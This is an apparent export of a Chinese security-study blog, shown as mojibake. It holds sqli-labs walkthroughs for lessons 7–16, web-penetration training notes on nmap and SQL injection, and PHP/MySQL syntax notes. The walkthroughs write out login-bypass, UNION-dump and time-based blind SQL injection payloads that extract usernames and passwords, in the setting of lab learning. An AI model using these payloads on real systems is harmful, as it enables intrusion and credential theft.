Aï¼šç”¨æˆ·å°†æ•°æ®ä»ç½‘é¡µæˆ–è€…å®¢æˆ·ç«¯æäº¤ åˆ°æœåŠ¡å™¨ç«¯ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ç™»å½•è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨æˆ·åå’Œå¯†ç ä»¥è¡¨å•çš„å½¢å¼æäº¤ï¼Œ æäº¤åˆ°æœåŠ¡å™¨åæœåŠ¡å™¨å†åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒéªŒè¯ã€‚ Qï¼šä¸getæ³¨å…¥çš„åŒºåˆ« Aï¼šgetè¯·æ±‚ä¸å‘é€æ•°æ®è‡³æœåŠ¡å™¨ï¼Œè€Œpostè¯·æ±‚åŒ…å«æ•°æ®æäº¤ postç±»å‹sqlæ³¨å…¥åŸç†ï¼šå°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œä»£ç /æŒ‡ä»¤ï¼Œåœ¨æ•°æ®åº“ä¸­æ“ä½œã€æ‰§è¡Œã€‚ lesson11ï¼šlesson11çš„æºç ï¼š 1@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;; é€šè¿‡æŸ¥çœ‹lesson11çš„æºç æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹è¾“å…¥çš„å†…å®¹è¿›è€Œä¿®æ”¹æ•°æ®åº“ä¸­ä»£ç ï¼Œ å¦‚username=rootâ€˜ or â€™1â€™=â€˜1ï¼Œpassword=éšæ„ï¼›å‘ç°ç™»å…¥æˆåŠŸã€‚ï¼ˆusernameå¸¦å…¥æ•°æ®åº“ä¸ºï¼š@$sql=â€SELECT username, password FROM users WHERE username=â€™$rootâ€˜ or â€™1â€™=â€˜1â€™ and password=â€™$éšæ„â€™ LIMIT 0,1â€;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªè¦æ•°æ®åº“ä¸­å­˜åœ¨ç”¨æˆ·rootï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥æ’æˆç«‹ï¼‰ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥é€šè¿‡æ›´æ”¹ä¸Šä¼ æ•°æ®æ¥è¾¾åˆ°è·å–æ•°æ®åº“ä¿¡æ¯çš„ç›®çš„ã€‚ ä¸€.çˆ†åº“è¾“å…¥ï¼š 11&#x27; union select 1,database()# å¾—ï¼š äºŒ.çˆ†è¡¨è¾“å…¥ï¼š 11&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# å¾—ï¼š ä¸‰.çˆ†åˆ—11&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; # å¾—ï¼š å››.çˆ†å€¼è¾“å…¥ï¼š 11&#x27; union select (select group_concat(username) from users), (select group_concat(password) from users)# å¾—ï¼š lesson12ï¼šlesson12çš„æºç ï¼š 123 $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password= ($passwd) LIMIT 0,1&quot;; æŸ¥çœ‹æºä»£ç ä¸æ˜¯å¾ˆèƒ½ç›´è§‚çœ‹å‡ºæ•°æ®åº“å¦‚ä½•é—­åˆå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡ç½‘é¡µæ£€æµ‹å…¶æ˜¯å¦‚ä½•é—­åˆå‚æ•°çš„ï¼š username=aâ€™aâ€aâ€™)a å¾—ï¼š æˆ‘ä»¬é€šè¿‡è§‚å¯Ÿpasswordéƒ¨åˆ†å¯çŸ¥æ³¨å…¥ç‚¹ä¸ºâ€˜â€™ï¼‰ï¼› ä½†æ˜¯å½“æˆ‘æ„é€ payloadï¼šrootâ€˜â€™ï¼‰#æ—¶æˆ‘å‘ç°é¡µé¢è¿”å›é”™è¯¯ï¼Œè€Œä¸”æˆ‘å‘ç°è¿™å…³æ— æ³•é€šè¿‡æ³¨é‡Šè¾¾åˆ°ç¯¡æ”¹æ•°æ®åº“ã€‚ å‰©ä¸‹çš„å’Œlesson11ä¸€æ ·ã€‚ lesson13ï¼šé€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ–åœ¨ç½‘é¡µä¸Šè¾“å…¥é”™è¯¯sqlè¯­æ³•ï¼Œå¯çŸ¥æ³¨å…¥ç‚¹ä¸ºï¼šâ€˜ï¼‰ ä½†æ˜¯ç™»å…¥æˆåŠŸåæˆ‘ä»¬çœ‹ä¸åˆ°é¡µé¢æœ‰å›æ˜¾æ•°æ®ï¼Œé‚£ä¹ˆè¿™é¢˜è¦é‡‡ç”¨ç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚ lesson14ï¼šé€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ–åœ¨ç½‘é¡µä¸Šè¾“å…¥é”™è¯¯sqlè¯­æ³•ï¼Œå¯çŸ¥æ³¨å…¥ç‚¹ä¸º ï¼šâ€ ä½†æ˜¯ç™»å…¥æˆåŠŸåæˆ‘ä»¬çœ‹ä¸åˆ°é¡µé¢æœ‰å›æ˜¾æ•°æ®ï¼Œé‚£ä¹ˆè¿™é¢˜è¦é‡‡ç”¨ç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚ lesson15ï¼šæ— æ³•é€šè¿‡sqlè¯­æ³•é”™è¯¯æ¥æ£€æµ‹æ•°æ®åº“é—­åˆå‚æ•°ç±»å‹ï¼Œ æŸ¥çœ‹æºç ï¼š 1@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; æ³¨å…¥ç‚¹ä¸ºï¼šâ€™ ï¼› ç™»å…¥æˆåŠŸï¼Œæ— å›æ˜¾ï¼Œç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚ lesson16ï¼šåšè¿™å…³çš„æ—¶å€™æ”¾äº†ä¸€ä¸ªé”™è¯¯å¡äº†å¥½ä¹…ï¼šæŠŠâ€œï¼‰å‹çš„åŒå¼•å·ç”¨ä¸¤ä¸ªå•å¼•å·ä»£æ›¿äº†ï¼Œå¯¼è‡´ä¸€ç›´è¾“å…¥è¿”å›å€¼é”™è¯¯ã€‚ æŸ¥çœ‹æºç å¯å¾—æ³¨å…¥ç‚¹ä¸ºï¼šâ€)ï¼› ç™»å…¥æˆåŠŸï¼Œæ— å›æ˜¾ï¼Œç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"2021.1æœˆwebæ¸—é€åŸ¹è®­","date":"2021-01-27T02:56:06.000Z","path":"2021/01/27/2021-1æœˆwebæ¸—é€åŸ¹è®­(1)/","text":"webæ¸—é€çš„å®è§‚æ€è·¯ï¼ša.ä¿¡æ¯æ”¶é›†b.æ¼æ´æŒ–æ˜c.æ¼æ´åˆ©ç”¨d.è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Šä¸€.ä¿¡æ¯æ”¶é›†1.åŸºæœ¬ä¿¡æ¯ï¼š ã€ŠåŸŸåä¿¡æ¯ï¼Œå­åŸŸåï¼Œipåœ°å€ï¼ŒåŒIPçš„å…¶ä»–ç½‘ç«™ä¿¡æ¯â€“ç«™é•¿ä¹‹å®¶ï¼› â€‹ è·å–å­åŸŸåâ€“å­åŸŸåæŒ–æ˜æœº â€‹ è·å–åŸŸåæˆ–IPåœ°å€â€“http://viewdns.infoã€https://www.dnsdb.io â€‹ æ ¹æ®IPåœ°å€æŸ¥è¯¢åŒä¸€IPåœ°å€çš„å…¶ä»–ä¿¡æ¯â€“http://114best.com/ip/114.aspx?w= ã€Šç«¯å£ï¼š80ï¼ˆhttpï¼‰443ï¼ˆHTTPSï¼‰ 445ï¼ˆå…±äº«æ–‡ä»¶å¤¹ï¼‰ï¼› ã€ŠæœåŠ¡ï¼ˆwebç‰ˆæœ¬ï¼‰ï¼ŒæœåŠ¡ç‰ˆæœ¬ï¼› 2.osæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š linuxï¼Œwindï¼Œmac 3.webä¸­é—´ä»¶ï¼ˆwebç¨‹åºï¼Œç”¨æ¥æä¾›ç½‘é¡µæœåŠ¡ï¼‰ Apacheï¼ˆä¸»æµï¼‰ï¼Œiisï¼ŒNginxï¼Œweblogic 4.æ•°æ®åº“ ç±»å‹ã€ç‰ˆæœ¬ï¼šmysqlï¼Œmssqlï¼Œoracleï¼Œaccess 5.æœåŠ¡å™¨åç«¯çš„è„šæœ¬ç±»å‹ã€ç‰ˆæœ¬ PHPã€JSPã€ASP ~ç«¯å£æ‰«ææŠ€æœ¯â€“NMAPåŸºæœ¬å‘½ä»¤æ ¼å¼ï¼šnmap -å‚æ•° ip/ipæ®µ/ä¸»æœºåœ°å€ Nmap TCPæ‰«æç«¯å£é€‰é¡¹:-sPï¼šç”¨pingçš„æ–¹å¼åˆ¤æ–­æ˜¯å¦æœ‰å­˜æ´»ä¸»æœº,ä¸æ‰«æç«¯å£ã€‚-sTï¼šä½¿ç”¨TCPè¿æ¥æ‰«æï¼Œå¯¹ç›®æ ‡ä¸»æœºæ‰€æœ‰ç«¯å£è¿›è¡Œå®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœæˆåŠŸå»ºç«‹è¿æ¥åˆ™ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚-sSï¼šä½¿ç”¨åŠå¼€è¿æ¥ï¼ˆSYN stealth)æ‰«æï¼Œä½¿ç”¨SYNæ ‡è®°ä½çš„æ•°æ®åŒ…è¿›è¡Œç«¯å£æ¢æµ‹ï¼Œæ”¶åˆ°SYN/ACKåŒ…åˆ™ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ”¶åˆ°RST/ACKåŒ…åˆ™ç«¯å£æ˜¯å…³é—­çš„ã€‚-sAï¼šTCP ACKæ‰«æä½¿ç”¨ACKæ ‡å¿—ä½æ•°æ®åŒ…ï¼Œè‹¥ç›®æ ‡ä¸»æœºå›å¤RSTæ•°æ®åŒ…ï¼Œåˆ™ç›®æ ‡ç«¯å£æ²¡æœ‰è¢«è¿‡æ»¤ï¼ˆç”¨äºå‘ç°é˜²ç«å¢™çš„è¿‡æ»¤è§„åˆ™)ã€‚ Nmap UDPæ‰«æç«¯å£é€‰é¡¹:-sUä½¿ç”¨UDPæ•°æ®åŒ…ç»è¡Œæ‰«æï¼Œè¿”å›UDPæŠ¥æ–‡ï¼Œåˆ™ç«¯å£æ˜¯å¼€æ”¾çš„;è¿”å›ä¸å¯è¾¾åˆ™ç«¯å£å¤„äºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€ã€‚ Nmapç›®æ ‡ç«¯å£é€‰é¡¹:-pï¼šæ‰«ææŒ‡å®šçš„ç«¯å£-Fï¼šå¿«é€Ÿæ‰«æ100ä¸ªå¸¸ç”¨çš„ç«¯å£-rï¼šé¡ºåºæ‰«æï¼ŒæŒ‰ä»å°åˆ°å¤§çš„é¡ºåºè¿›è¡Œç«¯å£æ‰«æ Nmapè¾“å‡ºé€‰é¡¹:-oNï¼šæ ‡å‡†è¾“å‡ºä¸ºæŒ‡å®šçš„æ–‡ä»¶-oXï¼šç”ŸæˆXMLæ ¼å¼æ–‡ä»¶å¯ä»¥è½¬æ¢æˆHTMLæ–‡ä»¶ å…¶ä»–å¸¸ç”¨é€‰é¡¹:-sVï¼šæ£€æµ‹æœåŠ¡ç«¯è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯-Oï¼šæ£€æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯-Pnï¼šç¦ç”¨nmapçš„ä¸»æœºæ£€æµ‹åŠŸèƒ½-Aï¼šæ¢æµ‹æœåŠ¡ç‰ˆæœ¬ã€å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œè¯†åˆ«ã€è¿›è¡Œè„šæœ¬æ‰«æã€è¿›è¡Œè·¯ç”±æ¢æµ‹ æ³¨ï¼šnmap -sP ipæ®µå¯æ£€æµ‹è¯¥ç½‘æ®µä¸‹æ‰€æœ‰å­˜æ´»çš„ä¸»æœº æœ¬ç« å‚è€ƒpptï¼šhttps://kdocs.cn/l/ctOPJlaBJgUw","tags":[{"name":"webæ¸—é€","slug":"webæ¸—é€","permalink":"http://example.com/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"2021-1æœˆwebæ¸—é€åŸ¹è®­(2)","date":"2021-01-27T02:56:06.000Z","path":"2021/01/27/2021-1æœˆwebæ¸—é€åŸ¹è®­(2)/","text":"SQLæ³¨å…¥åŸç†ï¼ˆwebæ¼æ´ï¼‰ï¼š å°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œä»£ç /æŒ‡ä»¤ï¼Œåœ¨æ•°æ®åº“ä¸­æ“ä½œã€æ‰§è¡Œ ä¾‹å¦‚ï¼šç”¨æˆ·åï¼šadmin å¯†ç ï¼š123 æ­£å¸¸å¸¦å…¥æ•°æ®åº“ä¸­æ‰§è¡Œï¼šselect *from users where username=â€˜adminâ€™ and password=â€˜123â€™â€“è¿”å›æ­£ç¡®ï¼ŒæˆåŠŸç™»å…¥ï¼› åˆ©ç”¨SQLæ³¨å…¥ï¼š æ„é€ payloadï¼šç”¨æˆ·åï¼šadminâ€˜ or â€™1â€˜=â€™1 å¯†ç =â€˜éšæ„â€™ï¼› å¸¦å…¥æ•°æ®åº“ä¸­æ‰§è¡Œï¼šselect *from users where username=â€˜adminâ€˜ or â€™1â€˜=â€™1â€™ and password=â€˜éšæ„â€™â€“è¿”å›æ­£ç¡®ï¼ŒæˆåŠŸç™»å…¥ï¼›æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•°æ®åº“è¯¯æŠŠç”¨æˆ·çš„è¾“å…¥å½“åšä»£ç ï¼Œæ•´åˆåˆ°æºç ä¸­ï¼Œ1=1æ’æˆç«‹æ•…å¯¼è‡´è¯¥è¯­å¥æ’æˆç«‹ã€‚ æ³¨ï¼šæ•°æ®åº“ä¸­ â€˜ = â€™ ä¼˜å…ˆçº§é«˜äº â€˜andâ€™ é«˜äº â€˜orâ€™ï¼› é¢„é˜²SQLæ³¨å…¥ï¼šè¿‡æ»¤ç”¨æˆ·çš„ç‰¹æ®Šè¾“å…¥ï¼ˆå…³é”®å­—ï¼šandç­‰ï¼Œå­—ç¬¦ï¼šâ€˜ ç­‰ï¼‰ï¼Œé¢„ç¼–è¯‘ï¼ˆå°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œå­—ç¬¦ä¸²ï¼Œå³ä¸æ•°æ®åº“ä¸ä¼šæ‰§è¡Œå¤¹æ‚åœ¨ç”¨æˆ·è¾“å…¥çš„ä»£ç ä¸­ï¼‰ï¼› åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼š (1)?id=1â€™ â€“é¡µé¢æ˜¯å¦æŠ¥é”™ (2)?id=1â€™ and â€˜1â€™=â€™1â€“é¡µé¢æ˜¯å¦æ­£å¸¸ (3)?id=1â€™ and â€˜1â€™=â€™2â€“é¡µé¢æ˜¯å¦å¼‚å¸¸ è‹¥(1)æŠ¥é”™(2)æ­£å¸¸(3)å¼‚å¸¸åˆ™è¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚ å‚è€ƒpptï¼šhttps://kdocs.cn/l/crYKxbz6UgjE å¯†ç goktech","tags":[{"name":"webæ¸—é€","slug":"webæ¸—é€","permalink":"http://example.com/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"PHPè¯­æ³•","date":"2021-01-25T04:18:49.000Z","path":"2021/01/25/PHPè¯­æ³•/","text":"PHPæ ‡è®°ï¼šæˆ‘ä»¬ä¸»è¦ä½¿ç”¨&lt; ?php ?&gt; ï¼› PHPä¸­çš„åˆ†éš”ç¬¦ï¼š1ã€PHPä¸­çš„â€œç»“æ„å®šä¹‰è¯­å¥â€ï¼ˆåˆ†æ”¯ï¼Œå¾ªç¯ï¼Œç±»ï¼Œå‡½æ•°ç­‰{}ç»“å°¾ï¼‰ï¼Œä¸éœ€è¦ä½¿ç”¨åˆ†å·ç»“å°¾ã€‚2ã€PHPä¸­çš„â€œåŠŸèƒ½æ‰§è¡Œè¯­å¥â€ï¼Œä¸ç”¨{}ç»“å°¾çš„ï¼Œå¿…é¡»ä½¿ç”¨åˆ†å·ç»“å°¾ã€‚ PHPä¸­çš„å˜é‡ï¼š1.PHPæ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ã€‚å˜é‡æ— éœ€å£°æ˜ï¼Œç›´æ¥ç»™å˜é‡èµ‹å€¼å³å¯ï¼Œå¹¶ä¸”å¯ä»¥åœ¨åç»­èµ‹å€¼è¿‡ç¨‹ä¸­éšæ—¶ä¿®æ”¹å˜é‡çš„æ•°æ®ç±»å‹ã€‚ 2.PHPä¸­å¯ä»¥ä½¿ç”¨è¿ç­‰åŒæ—¶å£°æ˜å¤šä¸ªå˜é‡ï¼Œè€Œä¸èƒ½ä½¿ç”¨é€—å·åˆ†éš”ã€‚egï¼š$a=$b=$c=10 spï¼šPHPè¯­æ³•å­¦ä¹ è¯¦æƒ…å‚è€ƒï¼šhttps://www.cnblogs.com/suitongyu/p/7748153.html","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"lesson9ã€lesson10","date":"2020-12-13T14:20:36.000Z","path":"2020/12/13/blog j/","text":"lesson9è¿™é¢˜å¾ˆæœ‰æ„æ€ï¼Œæˆ‘å‘ç°ä¸ç®¡è¾“å…¥ä»€ä¹ˆï¼Œè¿”å›å€¼éƒ½æ˜¯you are inï¼Œäºæ˜¯æˆ‘æŸ¥çœ‹æºä»£ç â€”â€” 123456789101112131415161718if($row) &#123; echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;&#x2F;font&gt;&quot;; &#125; else &#123; echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; &#x2F;&#x2F;print_r(mysql_error()); &#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;; echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;; &#125;&#125; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸è®ºè¾“å…¥ç»“æœæ­£ç¡®ä¸å¦è¾“å‡ºéƒ½ä¸ºyou are in é€šè¿‡é¢˜ç›®æˆ‘ä»¬çŸ¥é“æ³¨å…¥ç‚¹ä¸º â€™ äºæ˜¯æˆ‘è§‰å¾—å¯ä»¥åˆ©ç”¨æ—¶é—´ç›²æ³¨ï¼Œé€šè¿‡å»¶æ—¶åˆ¤æ–­è¯­å¥æ­£ç¡®ä¸å¦ï¼Œäºæ˜¯è¾“å…¥çˆ†åº“è¯­å¥â€”â€” 1?id&#x3D;1&#39; and If(substr(database(),1,1)&#x3D;&#39;e&#39;,sleep(5),1)--+ å‘ç°å¯è¡Œï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å†…å®¹å’Œlesson8å°±ä¸€æ¨¡ä¸€æ ·äº†ã€‚ lesson10è¿™é¢˜åŸºäºlesson9ï¼Œä½†æ³¨å…¥ç‚¹æœ‰åˆ«äºlesson9ä¸º â€˜â€™ å…¶ä½™çš„ä¹Ÿä¸€æ ·äº†ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lessen8","date":"2020-12-13T07:23:18.000Z","path":"2020/12/13/blog i/","text":"ä¸€.çˆ†åº“é¦–å…ˆè¾“å…¥â€”â€” 1?id&#x3D;1--+ é¡µé¢å›æ˜¾you are in æ¥ç€æ‰“å¼€æºç æŸ¥çœ‹åˆ°â€”â€” 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;; åˆ™æ³¨å…¥ç‚¹ä¸º â€˜ ï¼Œè¾“å…¥è¯­å¥â€”â€” 1?id&#x3D;0&#39; or 1&#x3D;1--+ å›æ˜¾æ­£ç¡®ã€‚é‚£ä¹ˆè¿™æ—¶æˆ‘è§‰å¾—è¿™å’Œlesson5æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼ŸæŸ¥çœ‹æºä»£ç å‘ç°â€”â€” 1&#x2F;&#x2F;print_r(mysql_error()); ä»–å¯¹mysqlæŠ¥é”™è¯­å¥è¿›è¡Œäº†æ³¨é‡Šï¼Œå³è¿™å…³ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚ äºæ˜¯æˆ‘ç”¨å¸ƒå°”ç›²æ³¨ï¼Œæˆ‘å‘ç°ä¸ç®¡æˆ‘è¾“å…¥è¯­å¥åˆ¤æ–­æ­£ç¡®ä¸å¦ä»–è¿”å›çš„éƒ½æ˜¯you are iné‚£ä¹ˆè¯´æ˜æˆ‘ä»¬æƒ³è¦ä½¿ç”¨å¸ƒå°”ç›²æ³¨ä¹Ÿæ˜¯ä¸è¡Œçš„ã€‚é‚£ä¹ˆæœ€åå°è¯•ä¸€ä¸‹æ—¶é—´ç›²æ³¨ï¼Œè¾“å…¥è¯­å¥â€”â€” 123?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+æˆ–?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+ å‘ç°å¯ä»¥è¡Œå¾—é€šï¼Œé‚£ä¹ˆæœ¬é¢˜ä½¿ç”¨æ—¶é—´ç›²æ³¨æ— ç–‘äº†ã€‚ äºŒ.çˆ†è¡¨è¾“å…¥è¯­å¥â€”â€” 1?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+ ä¸‰.çˆ†åˆ—è¾“å…¥è¯­å¥â€”â€” 1?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+ å››.çˆ†å€¼è¾“å…¥è¯­å¥â€”â€” 1?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"mysql","date":"2020-12-07T08:25:42.000Z","path":"2020/12/07/æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥/","text":"ä¸€.MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚1.å¢ï¼šæœ‰å››ç§æ–¹æ³•a.ä½¿ç”¨insertæ’å…¥å•è¡Œæ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºinsert into è¡¨åï¼ˆåˆ—åï¼‰ values ï¼ˆâ€™åˆ—å€¼â€™ï¼‰ï¼› ä¾‹å¦‚ï¼šinsert into lcjï¼ˆå§“åï¼Œç­çº§ï¼Œåº§å·ï¼‰values ï¼ˆâ€˜å°æ—â€™ï¼Œâ€˜ç½‘å®‰ä¸€ç­â€™ï¼Œâ€˜30â€™ï¼‰ï¼› b.insert è¡¨å set åˆ—å=â€˜åˆ—å€¼â€™ï¼Œåˆ—å=â€˜åˆ—å€¼â€™â€¦â€¦.. æ³¨ï¼šå¢åŠ çš„åˆ—å€¼æ˜¯å¡«å……åœ¨æ–°ä¸€è¡Œã€‚ 2.åˆ ï¼ša.ä½¿ç”¨deleteåˆ é™¤æ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºdelete from è¡¨å ï¼›å¯åœ¨è¡¨ååé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ã€‚ä¾‹å¦‚ï¼šdelete from lcj where name=â€˜å°æ—â€™ï¼›è¯‘ä¸ºåˆ é™¤è¡¨lcjä¸­åˆ—å€¼ä¸ºå°æ—çš„è¡Œï¼ˆæ³¨æ„ï¼šæ˜¯ä¸€æ•´è¡Œï¼ï¼‰3.æ”¹ï¼ša.è¿ç”¨updateå¯¹åŸ1åˆ—å€¼è¿›è¡Œæ”¹åŠ¨ï¼›è¯­æ³•update è¡¨å set åˆ—å=æ›´æ–°å€¼ï¼›ä¾‹å¦‚ï¼šupdate lcj set åº§å·=1ï¼›å¯åœ¨æ›´æ–°å€¼åé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ï¼›4.æŸ¥ï¼ša.æŸ¥è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼šselect *from è¡¨åï¼›b. äºŒ.MySQLè¯­å¥ä½¿ç”¨ç»ƒä¹ ã€‚1.å»ºç«‹æ•°æ®åº“ï¼šcreate database class character set gbk; å…¶ä¸­classä¸ºæ•°æ®åº“åã€‚ 2.ä½¿ç”¨æ•°æ®åº“ï¼šuse classï¼› 3.åˆ›å»ºè¡¨ï¼šcreate table aï¼ˆåˆ—å æ•°æ®ç±»å‹ï¼‰ï¼›å…¶ä¸­aä¸ºè¡¨åã€‚ å¦‚ï¼š{ create table class(name varchar(20)); } 4.æŸ¥çœ‹è¡¨æ•°æ®ï¼ˆå€¼ï¼‰ï¼šselect *form aï¼› 5.æŸ¥çœ‹è¡¨ç»“æ„ï¼šdesc aï¼› ä¸‰.ç‰¹æ®Šçš„å¢åŠ åˆ—ï¼šalter table è¡¨å add åˆ—å åˆ—å€¼ç±»å‹ çº¦æŸï¼› å°†æ—§è¡¨çš„å†…å®¹å¤åˆ¶åˆ°æ–°è¡¨ï¼šinsert into less42 select *from users é™„ï¼šMySQLå¢åˆ æ”¹æŸ¥è¯­å¥å­¦ä¹ èµ„æ–™https://www.iteye.com/blog/sakyone-365147 å››.æ•°æ®åº“alterçš„ç”¨æ³•ï¼š1ï¼šåˆ é™¤åˆ— ALTER TABLE ã€è¡¨åã€‘ DROP ã€åˆ—åã€‘ 2ï¼šå¢åŠ åˆ— ALTER TABLE ã€è¡¨åã€‘ ADD ã€åˆ—åã€‘ ã€ç±»å‹ã€‘alter table table1 add transactor varchar(10) not Null; 3ï¼šé‡å‘½ååˆ— ALTER TABLE ã€è¡¨åã€‘ CHANGE ã€åˆ—åã€‘ã€æ–°åã€‘ 4ï¼šä¿®æ”¹è¡¨å­—æ®µ alter table è¡¨åç§° change å­—æ®µåç§° å­—æ®µæ–°åç§° å­—æ®µæ–°ç±»å‹ [æ˜¯å¦å…è®¸éç©º];alter table è¡¨åç§° modify å­—æ®µåç§° å­—æ®µæ–°ç±»å‹ [æ˜¯å¦å…è®¸éç©º]; 5ï¼šæŸ¥è¯¢è¡¨çš„å­—æ®µä¿¡æ¯ desc è¡¨åç§°; 6ï¼šåˆ›å»ºç´¢å¼• ALTER TABLE tbl_name ADD INDEX index_name (column list); 7ï¼šåˆ é™¤ç´¢å¼• ALTER TABLE tbl_name DROP INDEX index_name (column list); 8ï¼šä¿®æ”¹è¡¨å ALTER TABLE è¡¨å rename æ–°è¡¨å; åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/sinat_36053757/article/details/83380684","tags":[{"name":"æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥","slug":"æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"}]},{"title":"lesson7","date":"2020-11-29T08:49:29.000Z","path":"2020/11/29/blog g/","text":"ä¸€.é¢„å¤‡1.åˆ©ç”¨load_flie()å‡½æ•°å¯¼å‡ºæ–‡ä»¶ï¼š load_file(file_name):è¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ æ³¨.ä½¿ç”¨æ¡ä»¶ï¼š a.å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¿…é¡»å®Œå…¨å¯è¯»ã€‚å½“æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…æ²¡æœ‰æƒé™è®¿é—®æ—¶å‡½æ•°çš„è¿”å›å€¼ä¸ºç©ºã€‚ b.æ¬²è¯»å–æ–‡ä»¶å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Šã€‚ c.å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´çš„è·¯å¾„ã€‚ d.æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äº max_allowed_packetã€‚ äºŒ.lesson7å®æˆ˜A.æŸ¥æ‰¾æ³¨å…¥ç‚¹ï¼šæŸ¥è¯¢æºä»£ç â€”â€” 1$sql&#x3D;&quot;SELECT * from users where id&#x3D;((&#39;$id&#39;)) limit 0,1&quot;; æˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ³¨å…¥ç±»å‹ä¸ºï¼šâ€™)) æ„é€ è¯­å¥â€”â€” 